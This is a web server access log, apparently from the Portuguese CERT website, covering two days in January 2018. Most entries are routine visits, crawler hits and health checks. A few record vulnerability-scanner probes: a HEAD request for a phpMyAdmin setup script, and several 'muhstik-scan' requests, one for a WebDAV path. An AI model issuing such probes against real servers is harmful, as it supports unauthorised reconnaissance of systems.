123.130.94.161 - - [22/Jan/2018:16:29:24 +0000] "GET /images/logo_republica_portuguesa_CTES.png HTTP/1.1" 200 9236 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
123.130.94.161 - - [22/Jan/2018:16:29:24 +0000] "GET /images/logo-fccn_201701.png HTTP/1.1" 200 10121 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
123.130.94.161 - - [22/Jan/2018:16:29:24 +0000] "GET /templates/beez_20/favicon.ico HTTP/1.1" 200 32988 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
35.224.32.195 - - [22/Jan/2018:21:08:20 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "ltx71 - (http://ltx71.com/)"
216.244.66.248 - - [22/Jan/2018:21:08:38 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
185.105.48.2 - - [22/Jan/2018:21:09:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
35.224.32.195 - - [22/Jan/2018:21:10:42 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "ltx71 - (http://ltx71.com/)"
185.105.48.2 - - [22/Jan/2018:21:14:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
35.224.32.195 - - [22/Jan/2018:21:15:21 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "ltx71 - (http://ltx71.com/)"
35.224.32.195 - - [22/Jan/2018:21:18:02 +0000] "GET /index.php/ferramentas HTTP/1.1" 200 13014 "-" "ltx71 - (http://ltx71.com/)"
35.224.32.195 - - [22/Jan/2018:21:19:01 +0000] "GET /index.php/contactos HTTP/1.1" 200 12225 "-" "ltx71 - (http://ltx71.com/)"
185.105.48.2 - - [22/Jan/2018:21:19:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
185.105.48.2 - - [22/Jan/2018:21:24:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
89.115.129.156 - - [22/Jan/2018:22:28:48 +0000] "GET /plugins/content/attachments/attachments1.css HTTP/1.1" 200 77 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
89.115.129.156 - - [22/Jan/2018:22:28:49 +0000] "GET /plugins/content/attachments/attachments.css HTTP/1.1" 200 6226 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
89.115.129.156 - - [22/Jan/2018:22:28:49 +0000] "GET /templates/beez_20/css/position.css HTTP/1.1" 200 6277 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
89.115.129.156 - - [22/Jan/2018:22:28:49 +0000] "GET /templates/system/css/system.css HTTP/1.1" 200 896 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
89.115.129.156 - - [22/Jan/2018:22:28:49 +0000] "GET /templates/beez_20/css/layout.css HTTP/1.1" 200 30158 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
89.115.129.156 - - [22/Jan/2018:22:28:50 +0000] "GET /templates/beez_20/css/general.css HTTP/1.1" 200 4143 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
89.115.129.156 - - [22/Jan/2018:22:28:50 +0000] "GET /media/system/css/system.css HTTP/1.1" 200 1446 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
89.115.129.156 - - [22/Jan/2018:22:28:50 +0000] "GET /templates/beez_20/css/nature.css HTTP/1.1" 200 19417 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:52 +0000] "GET / HTTP/1.1" 200 13833 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /plugins/content/attachments/attachments1.css HTTP/1.1" 200 77 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /templates/system/css/system.css HTTP/1.1" 200 896 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /templates/beez_20/css/position.css HTTP/1.1" 200 6277 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /plugins/content/attachments/attachments.css HTTP/1.1" 200 6226 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /templates/beez_20/css/layout.css HTTP/1.1" 200 30158 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /templates/beez_20/css/general.css HTTP/1.1" 200 4143 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /templates/beez_20/css/nature.css HTTP/1.1" 200 19417 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /media/system/js/core.js HTTP/1.1" 200 4784 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /media/system/js/mootools-core.js HTTP/1.1" 200 96362 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /media/system/js/caption.js HTTP/1.1" 200 729 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /plugins/content/attachments/attachments_refresh.js HTTP/1.1" 200 1835 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /media/system/css/system.css HTTP/1.1" 200 1446 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /templates/beez_20/javascript/md_stylechanger.js HTTP/1.1" 200 2104 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /templates/beez_20/javascript/hide.js HTTP/1.1" 200 8145 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /media/system/js/mootools-more.js HTTP/1.1" 200 238331 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /images/cert_rcts_cor-1.png HTTP/1.1" 200 27466 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /images/TI-Certified_120x120.jpg HTTP/1.1" 200 7510 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /images/first-logo-home.png HTTP/1.1" 200 2290 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /templates/beez_20/fonts/TitilliumMaps29L002.otf HTTP/1.1" 200 47984 "http://www.cert.rcts.pt/templates/beez_20/css/nature.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /images/membrorede.jpg HTTP/1.1" 200 13448 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
94.62.193.156 - - [22/Jan/2018:23:01:53 +0000] "GET /media/system/images/printButton.png HTTP/1.1" 200 228 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
66.249.66.143 - - [22/Jan/2018:23:03:18 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.141 - - [22/Jan/2018:23:03:18 +0000] "GET /index.php/noticias/1625-itij-torna-se-membro-da-rede-nacional-de-csirt HTTP/1.1" 200 10577 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.26 - - [22/Jan/2018:23:03:48 +0000] "GET /index.php/rede-nacional-csirt/32-rede-nacional-csirt HTTP/1.1" 200 20072 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
185.105.48.2 - - [22/Jan/2018:23:04:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
63.246.129.166 - - [22/Jan/2018:23:06:37 +0000] "HEAD /phpMyAdmin/scripts/setup.php HTTP/1.1" 403 - "-" "Mozilla/5.0"
35.224.32.195 - - [22/Jan/2018:23:07:54 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "ltx71 - (http://ltx71.com/)"
185.105.48.2 - - [22/Jan/2018:23:09:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
185.105.48.2 - - [22/Jan/2018:23:14:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
185.105.48.2 - - [22/Jan/2018:23:19:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
35.226.23.240 - - [22/Jan/2018:23:21:41 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "ltx71 - (http://ltx71.com/)"
35.226.23.240 - - [22/Jan/2018:23:22:37 +0000] "GET /index.php/contactos?page=&print=1&tmpl=component HTTP/1.1" 200 6155 "-" "ltx71 - (http://ltx71.com/)"
185.105.48.2 - - [22/Jan/2018:23:24:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
89.115.129.156 - - [22/Jan/2018:23:27:24 +0000] "GET /templates/beez_20/images/nav_level_1.gif HTTP/1.1" 200 223 "http://www.cert.rcts.pt/templates/beez_20/css/nature.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
35.224.32.195 - - [22/Jan/2018:23:28:44 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "ltx71 - (http://ltx71.com/)"
185.105.48.2 - - [22/Jan/2018:23:29:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
54.210.155.187 - - [22/Jan/2018:23:31:01 +0000] "GET /index.php/8-alertas/alertas/1057-microsoft-windows-nao-desactiva-eficazmente-o-autorun?tmpl=component&print=1&page= HTTP/1.1" 200 9856 "-" "Mozilla/5.0 (compatible; linkdexbot/2.0; +http://www.linkdex.com/bots/)"
109.51.42.85 - - [23/Jan/2018:00:45:07 +0000] "GET / HTTP/1.1" 200 13833 "https://www.google.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /plugins/content/attachments/attachments1.css HTTP/1.1" 200 77 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /plugins/content/attachments/attachments.css HTTP/1.1" 200 6226 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /templates/system/css/system.css HTTP/1.1" 200 896 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /templates/beez_20/css/position.css HTTP/1.1" 200 6277 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /templates/beez_20/css/layout.css HTTP/1.1" 200 30158 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /templates/beez_20/css/general.css HTTP/1.1" 200 4143 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /templates/beez_20/css/nature.css HTTP/1.1" 200 19417 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /media/system/js/mootools-core.js HTTP/1.1" 200 96362 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /media/system/js/core.js HTTP/1.1" 200 4784 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /media/system/js/caption.js HTTP/1.1" 200 729 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /plugins/content/attachments/attachments_refresh.js HTTP/1.1" 200 1835 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /templates/beez_20/javascript/md_stylechanger.js HTTP/1.1" 200 2104 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /templates/beez_20/javascript/hide.js HTTP/1.1" 200 8145 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /images/cert_rcts_cor-1.png HTTP/1.1" 200 27466 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /images/TI-Certified_120x120.jpg HTTP/1.1" 200 7510 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /images/first-logo-home.png HTTP/1.1" 200 2290 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /media/system/images/printButton.png HTTP/1.1" 200 228 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
109.51.42.85 - - [23/Jan/2018:00:45:08 +0000] "GET /images/membrorede.jpg HTTP/1.1" 200 13448 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
185.105.48.2 - - [23/Jan/2018:01:19:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
185.105.48.2 - - [23/Jan/2018:01:24:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
185.105.48.2 - - [23/Jan/2018:01:29:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
185.105.48.2 - - [23/Jan/2018:01:34:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
185.105.48.2 - - [23/Jan/2018:01:39:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
40.77.167.112 - - [23/Jan/2018:08:19:21 +0000] "GET / HTTP/1.1" 200 13927 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.255.71.119 - - [23/Jan/2018:08:20:43 +0000] "GET /index.php/ferramentas HTTP/1.1" 200 13108 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
173.212.202.220 - - [23/Jan/2018:08:21:02 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
173.212.202.220 - - [23/Jan/2018:08:21:08 +0000] "GET /index.php/12-npticias/noticias/1700-accao-de-formacao-cert-pt HTTP/1.1" 200 13769 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
173.212.202.220 - - [23/Jan/2018:08:21:16 +0000] "GET /index.php/20-institucional/relatorios-de-actividades HTTP/1.1" 200 13301 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
173.212.202.220 - - [23/Jan/2018:08:21:28 +0000] "GET /index.php/8-alertas/alertas/1514-actualizacoes-oracle-para-multiplas-vulnerabilidades?tmpl=component&print=1&page= HTTP/1.1" 200 6439 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
173.212.202.220 - - [23/Jan/2018:08:21:35 +0000] "GET /index.php/servicos/tratamento-de-incidentes/14-institucional HTTP/1.1" 200 21369 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
173.212.202.220 - - [23/Jan/2018:08:21:53 +0000] "GET /index.php/servicos/tratamento-de-incidentes/20-institucional/relatorios-de-actividades HTTP/1.1" 200 13730 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
185.105.48.2 - - [23/Jan/2018:08:24:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
185.105.48.2 - - [23/Jan/2018:08:29:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
185.105.48.2 - - [23/Jan/2018:08:34:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
185.105.48.2 - - [23/Jan/2018:08:39:19 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
185.105.48.2 - - [23/Jan/2018:08:44:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
216.244.66.196 - - [23/Jan/2018:08:49:15 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
185.105.48.2 - - [23/Jan/2018:08:49:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
31.166.112.171 - - [23/Jan/2018:08:52:36 +0000] "GET / HTTP/1.1" 200 13834 "-" "muhstik/1.0"
31.166.112.171 - - [23/Jan/2018:08:52:47 +0000] "GET /webdav HTTP/1.1" 404 287 "-" "muhstik-scan/1.0"
31.166.112.171 - - [23/Jan/2018:08:53:37 +0000] "GET / HTTP/1.1" 200 13834 "-" "muhstik-scan"
31.166.112.171 - - [23/Jan/2018:08:53:38 +0000] "GET / HTTP/1.1" 200 13834 "-" "muhstik-scan"
31.166.112.171 - - [23/Jan/2018:08:53:39 +0000] "GET / HTTP/1.1" 200 13834 "-" "muhstik-scan"
185.105.48.2 - - [23/Jan/2018:08:54:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
199.58.86.211 - - [23/Jan/2018:08:59:04 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
199.58.86.211 - - [23/Jan/2018:08:59:05 +0000] "GET / HTTP/1.1" 200 13927 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
185.105.48.2 - - [23/Jan/2018:08:59:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
153.146.195.3 - - [23/Jan/2018:09:00:12 +0000] "GET / HTTP/1.1" 200 13833 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:12 +0000] "GET / HTTP/1.1" 200 13833 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /plugins/content/attachments/attachments1.css HTTP/1.1" 200 77 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /plugins/content/attachments/attachments.css HTTP/1.1" 200 6226 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /templates/beez_20/css/position.css HTTP/1.1" 200 6277 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /templates/beez_20/css/print.css HTTP/1.1" 200 5174 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /templates/beez_20/css/layout.css HTTP/1.1" 200 30158 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /templates/beez_20/css/general.css HTTP/1.1" 200 4143 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /templates/system/css/system.css HTTP/1.1" 200 896 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /media/system/js/core.js HTTP/1.1" 200 4784 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /media/system/js/caption.js HTTP/1.1" 200 729 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /media/system/js/mootools-core.js HTTP/1.1" 200 96362 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
